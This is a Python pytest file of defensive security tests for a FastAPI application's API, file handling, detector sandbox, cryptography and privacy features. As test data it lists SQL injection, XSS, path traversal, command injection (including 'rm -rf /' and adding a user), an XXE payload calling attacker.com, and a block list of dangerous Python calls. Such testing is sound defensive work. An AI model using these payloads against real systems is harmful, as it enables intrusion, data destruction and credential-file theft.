"""
Comprehensive security tests for API endpoints and file handling.
Tests authentication, authorization, input validation, and security vulnerabilities.
"""

import pytest
import os
import tempfile
import shutil
from pathlib import Path
import json
import base64
import hashlib
import hmac
import jwt
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, MagicMock
import subprocess
import requests

from fastapi.testclient import TestClient
from CAMF.services.api_gateway.main import app
from CAMF.services.storage.file_utils import FileManager
from CAMF.services.detector_framework.sandbox import Sandbox
from CAMF.common.utils import safe_json_loads, sanitize_path


class TestAPISecurityVulnerabilities:
    """Test API endpoints for common security vulnerabilities."""
    
    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)
    
    def test_sql_injection_prevention(self, client):
        """Test prevention of SQL injection attacks."""
        # Create project for testing
        project = client.post("/api/projects", json={"name": "Security Test"}).json()
        
        # Attempt SQL injection in various endpoints
        sql_injection_payloads = [
            "'; DROP TABLE projects; --",
            "1' OR '1'='1",
            "1; UPDATE projects SET name='hacked' WHERE 1=1; --",
            "' UNION SELECT * FROM users --",
            "1' AND (SELECT COUNT(*) FROM projects) > 0 --"
        ]
        
        for payload in sql_injection_payloads:
            # Try injection in query parameters
            response = client.get(f"/api/projects?name={payload}")
            assert response.status_code in [200, 400, 422]  # Should handle safely
            
            # Try injection in path parameters
            response = client.get(f"/api/projects/{payload}")
            assert response.status_code in [400, 404, 422]
            
            # Try injection in JSON body
            response = client.post("/api/scenes", json={
                "project_id": payload,
                "name": "Test Scene"
            })
            assert response.status_code in [400, 422]
        
        # Verify database integrity
        projects = client.get("/api/projects").json()
        assert any(p["name"] == "Security Test" for p in projects)
    
    def test_xss_prevention(self, client):
        """Test prevention of Cross-Site Scripting (XSS) attacks."""
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<script>document.cookie</script>"
        ]
        
        # Create project with XSS attempts
        for payload in xss_payloads:
            response = client.post("/api/projects", json={"name": payload})
            
            if response.status_code == 200:
                project = response.json()
                # Verify payload is escaped/sanitized
                assert "<script>" not in project["name"]
                assert "javascript:" not in project["name"]
                
                # Verify in GET response
                get_response = client.get(f"/api/projects/{project['id']}")
                get_data = get_response.json()
                assert "<script>" not in get_data["name"]
    
    def test_path_traversal_prevention(self, client):
        """Test prevention of path traversal attacks."""
        # Path traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/www/../../etc/passwd",
            "C:\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        for payload in traversal_payloads:
            # Try in file upload endpoint
            response = client.post("/api/upload/frame", json={
                "file_path": payload,
                "take_id": 1
            })
            assert response.status_code in [400, 403, 422]
            
            # Try in file read endpoint
            response = client.get(f"/api/frames/file?path={payload}")
            assert response.status_code in [400, 403, 404]
    
    def test_command_injection_prevention(self, client):
        """Test prevention of command injection attacks."""
        # Command injection payloads
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "& dir C:\\",
            "; rm -rf /",
            "|| net user hacker password /add"
        ]
        
        # Test in endpoints that might execute commands
        for payload in cmd_payloads:
            # Video processing endpoint
            response = client.post("/api/process/video", json={
                "filename": f"video{payload}.mp4",
                "options": {"format": payload}
            })
            assert response.status_code in [400, 422]
            
            # Export endpoint
            response = client.post("/api/export", json={
                "filename": payload,
                "format": "pdf"
            })
            assert response.status_code in [400, 422]
    
    def test_xxe_prevention(self, client):
        """Test prevention of XML External Entity (XXE) attacks."""
        # XXE payload
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
            <!ENTITY xxe2 SYSTEM "http://attacker.com/evil.dtd">
        ]>
        <root>
            <data>&xxe;</data>
            <data>&xxe2;</data>
        </root>"""
        
        # Try XXE in any XML processing endpoint
        response = client.post("/api/import/xml", 
                             content=xxe_payload,
                             headers={"Content-Type": "application/xml"})
        
        assert response.status_code in [400, 415, 422]
        
        # Verify no external entity was processed
        if response.status_code == 200:
            assert "/etc/passwd" not in response.text
            assert "attacker.com" not in response.text
    
    def test_csrf_protection(self, client):
        """Test CSRF protection mechanisms."""
        # Attempt state-changing operation without CSRF token
        response = client.post("/api/projects/1/delete",
                             headers={"Origin": "http://evil.com"})
        
        # Should be rejected or require additional validation
        assert response.status_code in [400, 403]
        
        # Test with proper origin
        response = client.post("/api/projects/1/delete",
                             headers={"Origin": "http://localhost:3000"})
        # May succeed or fail for other reasons, but not CSRF
        assert response.status_code != 403
    
    def test_rate_limiting(self, client):
        """Test rate limiting to prevent abuse."""
        # Make many rapid requests
        responses = []
        for i in range(150):  # Exceed expected rate limit
            response = client.get("/api/projects")
            responses.append(response.status_code)
        
        # Should see rate limiting kick in
        assert 429 in responses  # Too Many Requests
        
        # Check rate limit headers
        limited_response = next(r for r in responses if r == 429)
        # Would check for Retry-After header
    
    def test_authentication_bypass_attempts(self, client):
        """Test various authentication bypass attempts."""
        # Attempt to access protected endpoints
        bypass_attempts = [
            {"Authorization": "Bearer null"},
            {"Authorization": "Bearer undefined"},
            {"Authorization": "Bearer "},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Auth-Token": "admin"}
        ]
        
        for headers in bypass_attempts:
            response = client.get("/api/admin/users", headers=headers)
            assert response.status_code in [401, 403]
    
    def test_sensitive_data_exposure(self, client):
        """Test prevention of sensitive data exposure."""
        # Create test data
        project = client.post("/api/projects", json={"name": "Test"}).json()
        
        # Check responses don't contain sensitive info
        response = client.get(f"/api/projects/{project['id']}")
        data = response.json()
        
        # Should not contain
        assert "password" not in data
        assert "secret" not in data
        assert "token" not in data
        assert "database_url" not in data
        
        # Check error responses
        error_response = client.get("/api/projects/99999")
        error_text = error_response.text
        
        # Should not leak system info
        assert "/home/" not in error_text
        assert "C:\\" not in error_text
        assert "Traceback" not in error_text
        assert "at line" not in error_text


class TestFileHandlingSecurity:
    """Test file handling security measures."""
    
    @pytest.fixture
    def file_manager(self):
        """Create file manager instance."""
        with tempfile.TemporaryDirectory() as temp_dir:
            manager = FileManager(base_path=temp_dir)
            yield manager
    
    def test_file_upload_validation(self, file_manager):
        """Test file upload security validation."""
        # Test dangerous file extensions
        dangerous_files = [
            "malware.exe",
            "script.bat",
            "shell.sh",
            "backdoor.php",
            "evil.jsp",
            "hack.aspx",
            "../../../etc/passwd",
            "normal.jpg.exe",
            "image.jpg\x00.exe"  # Null byte injection
        ]
        
        for filename in dangerous_files:
            is_safe = file_manager.is_safe_filename(filename)
            assert is_safe is False
        
        # Test safe files
        safe_files = ["image.jpg", "video.mp4", "document.pdf"]
        for filename in safe_files:
            assert file_manager.is_safe_filename(filename) is True
    
    def test_file_content_validation(self, file_manager):
        """Test file content validation."""
        # Create files with misleading extensions
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            # Write executable content
            f.write(b"MZ\x90\x00")  # PE header
            malicious_jpg = f.name
        
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            # Write actual JPEG header
            f.write(b"\xFF\xD8\xFF\xE0")
            valid_jpg = f.name
        
        try:
            # Validate content matches extension
            assert file_manager.validate_file_content(malicious_jpg, "image/jpeg") is False
            assert file_manager.validate_file_content(valid_jpg, "image/jpeg") is True
        finally:
            os.unlink(malicious_jpg)
            os.unlink(valid_jpg)
    
    def test_zip_bomb_prevention(self, file_manager):
        """Test prevention of zip bomb attacks."""
        # Create a zip bomb (small file that expands massively)
        # In practice, would use actual zip bomb for testing
        
        max_uncompressed_size = 100 * 1024 * 1024  # 100MB limit
        
        # Mock zip file check
        def check_zip_bomb(filepath):
            # Would actually check compression ratio
            return file_manager.get_uncompressed_size(filepath) < max_uncompressed_size
        
        # Test various compression ratios
        assert check_zip_bomb("normal.zip") is True
        # assert check_zip_bomb("zipbomb.zip") is False
    
    def test_symlink_attack_prevention(self, file_manager):
        """Test prevention of symlink attacks."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create symlink to sensitive file
            sensitive_file = "/etc/passwd"
            symlink = os.path.join(temp_dir, "link_to_passwd")
            
            if os.path.exists(sensitive_file):
                try:
                    os.symlink(sensitive_file, symlink)
                    
                    # Should not follow symlinks outside base directory
                    content = file_manager.read_file(symlink)
                    assert content is None
                except OSError:
                    # May not have permission to create symlink
                    pass
    
    def test_file_permission_security(self, file_manager):
        """Test secure file permissions."""
        # Create file
        test_file = file_manager.create_file("test.txt", b"content")
        
        # Check permissions
        stat_info = os.stat(test_file)
        mode = stat_info.st_mode
        
        # Should not be world-writable
        assert not (mode & 0o002)
        
        # Should not be executable
        assert not (mode & 0o111)


class TestDetectorSandboxSecurity:
    """Test detector sandboxing security measures."""
    
    def test_resource_limit_enforcement(self):
        """Test enforcement of resource limits."""
        sandbox = Sandbox(
            memory_limit=100 * 1024 * 1024,  # 100MB
            cpu_limit=0.5,  # 50% CPU
            time_limit=10,  # 10 seconds
            network_enabled=False
        )
        
        # Test memory limit
        def memory_hog():
            data = []
            while True:
                data.append("x" * 1024 * 1024)  # 1MB strings
        
        with pytest.raises(MemoryError):
            sandbox.execute(memory_hog)
        
        # Test time limit
        def infinite_loop():
            while True:
                pass
        
        with pytest.raises(TimeoutError):
            sandbox.execute(infinite_loop)
    
    def test_filesystem_isolation(self):
        """Test filesystem isolation in sandbox."""
        sandbox = Sandbox(allowed_paths=["/tmp/sandbox"])
        
        # Test reading outside sandbox
        def read_passwd():
            with open("/etc/passwd", "r") as f:
                return f.read()
        
        with pytest.raises(PermissionError):
            sandbox.execute(read_passwd)
        
        # Test writing outside sandbox
        def write_system():
            with open("/tmp/evil.txt", "w") as f:
                f.write("gotcha")
        
        with pytest.raises(PermissionError):
            sandbox.execute(write_system)
    
    def test_network_isolation(self):
        """Test network isolation in sandbox."""
        sandbox = Sandbox(network_enabled=False)
        
        # Test network access
        def make_request():
            import urllib.request
            return urllib.request.urlopen("http://example.com").read()
        
        with pytest.raises(Exception):  # Network disabled
            sandbox.execute(make_request)
    
    def test_code_injection_prevention(self):
        """Test prevention of code injection in detectors."""
        # Dangerous code patterns that should be blocked
        dangerous_code = [
            "import os; os.system('rm -rf /')",
            "__import__('os').system('whoami')",
            "eval('__import__(\"os\").system(\"ls\")')",
            "exec(compile('import os; os.system(\"pwd\")', '<string>', 'exec'))",
            "open('/etc/passwd').read()",
            "__builtins__['__import__']('subprocess').call(['ls'])"
        ]
        
        validator = DetectorCodeValidator()
        
        for code in dangerous_code:
            is_safe = validator.is_safe_code(code)
            assert is_safe is False


class TestCryptographicSecurity:
    """Test cryptographic security measures."""
    
    def test_password_hashing(self):
        """Test secure password hashing."""
        from CAMF.common.auth import hash_password, verify_password
        
        password = "SecureP@ssw0rd123"
        
        # Hash password
        hashed = hash_password(password)
        
        # Should use strong algorithm (bcrypt, scrypt, or argon2)
        assert hashed != password
        assert len(hashed) > 50  # Sufficient length
        
        # Should be salted (different hashes for same password)
        hashed2 = hash_password(password)
        assert hashed != hashed2
        
        # Verification should work
        assert verify_password(password, hashed) is True
        assert verify_password("wrong_password", hashed) is False
    
    def test_token_security(self):
        """Test JWT token security."""
        secret_key = "test_secret_key_for_testing_only"
        
        # Create token
        payload = {
            "user_id": 123,
            "exp": datetime.utcnow() + timedelta(hours=1)
        }
        
        token = jwt.encode(payload, secret_key, algorithm="HS256")
        
        # Verify token
        decoded = jwt.decode(token, secret_key, algorithms=["HS256"])
        assert decoded["user_id"] == 123
        
        # Test token tampering
        tampered_token = token[:-10] + "tampered123"
        with pytest.raises(jwt.InvalidSignatureError):
            jwt.decode(tampered_token, secret_key, algorithms=["HS256"])
        
        # Test expired token
        expired_payload = {
            "user_id": 123,
            "exp": datetime.utcnow() - timedelta(hours=1)
        }
        expired_token = jwt.encode(expired_payload, secret_key, algorithm="HS256")
        
        with pytest.raises(jwt.ExpiredSignatureError):
            jwt.decode(expired_token, secret_key, algorithms=["HS256"])
    
    def test_api_key_generation(self):
        """Test secure API key generation."""
        from CAMF.common.auth import generate_api_key
        
        # Generate keys
        keys = set()
        for _ in range(100):
            key = generate_api_key()
            keys.add(key)
        
        # All should be unique
        assert len(keys) == 100
        
        # Should have sufficient entropy
        for key in keys:
            assert len(key) >= 32  # At least 32 characters
            assert not key.isalnum()  # Should contain special characters
    
    def test_secure_random_generation(self):
        """Test cryptographically secure random number generation."""
        import secrets
        
        # Generate random tokens
        tokens = [secrets.token_hex(16) for _ in range(100)]
        
        # All should be unique
        assert len(set(tokens)) == 100
        
        # Check randomness quality (basic check)
        all_chars = "".join(tokens)
        char_distribution = {}
        for char in all_chars:
            char_distribution[char] = char_distribution.get(char, 0) + 1
        
        # Distribution should be relatively even
        frequencies = list(char_distribution.values())
        assert max(frequencies) / min(frequencies) < 2.0


class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_integer_overflow_prevention(self, client):
        """Test prevention of integer overflow attacks."""
        # Large numbers that might cause overflow
        overflow_values = [
            2**63,  # Max int64 + 1
            -2**63 - 1,  # Min int64 - 1
            10**100,  # Very large number
            float('inf'),
            float('-inf')
        ]
        
        for value in overflow_values:
            response = client.post("/api/frames", json={
                "frame_number": value,
                "take_id": 1
            })
            assert response.status_code in [400, 422]
    
    def test_unicode_normalization(self):
        """Test Unicode normalization to prevent homograph attacks."""
        # Different Unicode representations of "admin"
        homographs = [
            "admin",  # Latin
            "аdmin",  # Cyrillic 'а'
            "ɑdmin",  # Latin alpha
            "admin",  # With zero-width space
        ]
        
        normalized = [sanitize_username(name) for name in homographs]
        
        # Should detect different representations
        assert len(set(normalized)) > 1
    
    def test_regex_dos_prevention(self):
        """Test prevention of ReDoS (Regular Expression Denial of Service)."""
        # ReDoS vulnerable patterns
        dangerous_inputs = [
            "a" * 100 + "!",
            "x" * 1000,
            "((((((((((((((((((((((((((((a))))))))))))))))))))))))))" * 10
        ]
        
        # Validator should timeout or reject
        validator = InputValidator(timeout=1.0)
        
        for input_str in dangerous_inputs:
            start = time.time()
            is_valid = validator.validate_email(input_str + "@example.com")
            duration = time.time() - start
            
            assert duration < 1.0  # Should not hang
            assert is_valid is False


class TestSecurityHeaders:
    """Test security headers in API responses."""
    
    def test_security_headers_present(self, client):
        """Test that security headers are present in responses."""
        response = client.get("/api/projects")
        
        # Check security headers
        headers = response.headers
        
        # Content Security Policy
        assert "Content-Security-Policy" in headers
        csp = headers.get("Content-Security-Policy", "")
        assert "default-src" in csp
        assert "script-src" in csp
        
        # Other security headers
        assert headers.get("X-Content-Type-Options") == "nosniff"
        assert headers.get("X-Frame-Options") in ["DENY", "SAMEORIGIN"]
        assert "Strict-Transport-Security" in headers
        assert headers.get("X-XSS-Protection") == "1; mode=block"
        
        # Should not expose server info
        assert "Server" not in headers or "version" not in headers.get("Server", "").lower()
        assert "X-Powered-By" not in headers


class TestDataPrivacy:
    """Test data privacy and GDPR compliance features."""
    
    def test_data_anonymization(self):
        """Test data anonymization capabilities."""
        from CAMF.common.privacy import anonymize_user_data
        
        user_data = {
            "id": 123,
            "name": "John Doe",
            "email": "john.doe@example.com",
            "ip_address": "192.168.1.100",
            "phone": "+1-555-123-4567",
            "notes": "User complained about issue XYZ"
        }
        
        anonymized = anonymize_user_data(user_data)
        
        # PII should be anonymized
        assert anonymized["name"] != "John Doe"
        assert "@" not in anonymized["email"]
        assert "192.168" not in anonymized["ip_address"]
        assert "555" not in anonymized["phone"]
        
        # ID should be preserved for referential integrity
        assert anonymized["id"] == 123
    
    def test_data_export_filtering(self, client):
        """Test that data exports filter sensitive information."""
        # Create test data
        project = client.post("/api/projects", json={"name": "Privacy Test"}).json()
        
        # Export data
        export_response = client.get(f"/api/projects/{project['id']}/export")
        export_data = export_response.json()
        
        # Should not contain internal fields
        assert "_internal_id" not in export_data
        assert "deleted_at" not in export_data
        assert "security_token" not in export_data
    
    def test_audit_logging(self):
        """Test security audit logging."""
        from CAMF.common.audit import AuditLogger
        
        logger = AuditLogger()
        
        # Log security event
        logger.log_security_event({
            "event_type": "failed_login",
            "user": "admin",
            "ip_address": "192.168.1.100",
            "timestamp": datetime.utcnow()
        })
        
        # Verify log entry
        recent_events = logger.get_recent_events(event_type="failed_login")
        assert len(recent_events) > 0
        
        # Should track patterns
        suspicious = logger.detect_suspicious_patterns(
            user="admin",
            timeframe=timedelta(minutes=5)
        )
        # Multiple failed logins should be flagged
        assert suspicious is not None


def sanitize_username(username):
    """Sanitize username for security."""
    # Normalize Unicode
    import unicodedata
    normalized = unicodedata.normalize('NFKC', username)
    
    # Remove dangerous characters
    safe_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-')
    sanitized = ''.join(c for c in normalized if c in safe_chars)
    
    return sanitized


class InputValidator:
    """Input validation with timeout protection."""
    
    def __init__(self, timeout=1.0):
        self.timeout = timeout
    
    def validate_email(self, email):
        """Validate email with timeout protection."""
        import re
        import signal
        
        def timeout_handler(signum, frame):
            raise TimeoutError("Validation timeout")
        
        # Set timeout
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(int(self.timeout))
        
        try:
            # Simple email regex (not vulnerable to ReDoS)
            pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
            result = bool(re.match(pattern, email))
            signal.alarm(0)  # Cancel alarm
            return result
        except TimeoutError:
            signal.alarm(0)
            return False


class DetectorCodeValidator:
    """Validate detector code for security."""
    
    def is_safe_code(self, code):
        """Check if code is safe to execute."""
        dangerous_patterns = [
            'import os',
            'import subprocess',
            'import sys',
            '__import__',
            'eval(',
            'exec(',
            'compile(',
            'open(',
            'file(',
            'input(',
            'raw_input(',
            '__builtins__',
            'globals(',
            'locals(',
            'vars(',
            'dir(',
            'getattr(',
            'setattr(',
            'delattr(',
            '__dict__',
            '__class__',
            '__bases__',
            '__subclasses__'
        ]
        
        code_lower = code.lower()
        for pattern in dangerous_patterns:
            if pattern.lower() in code_lower:
                return False
        
        return True